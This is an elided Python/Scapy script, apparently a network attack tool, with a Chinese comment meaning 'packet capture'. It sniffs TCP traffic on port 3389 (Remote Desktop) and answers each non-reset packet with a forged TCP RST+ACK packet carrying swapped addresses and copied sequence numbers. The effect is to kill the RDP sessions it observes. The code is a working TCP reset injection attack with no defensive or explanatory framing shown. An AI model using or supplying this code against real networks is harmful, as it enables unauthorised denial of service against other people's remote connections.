...
def packet_callback(bag):
	...
	if flag.find('R') == -1:
		#bag.show()
		ether = Ether()
		ether.src = bag[Ether].dst
		ether.dst = bag[Ether].src
		ip = IP()
		ip.id = bag.id + 1
		ip.ttl = 64
		ip.flags = 'DF'
		...
		ip.dst = bag[IP].src
		tcp = TCP()
		tcp.sport = bag[TCP].dport
		tcp.dport = bag[TCP].sport
		tcp.seq = bag[TCP].ack
		tcp.ack = bag[TCP].seq
		tcp.flags = 'RA'
		rst_bag = ether/ip/tcp
		rst_bag.show()
		sendp(rst_bag, iface="eth0")

# 抓包
# sniff(filter="tcp and port 8774", count=30, prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))
sniff(iface='eth0', filter="tcp and port 3389", count=0, prn=packet_callback)
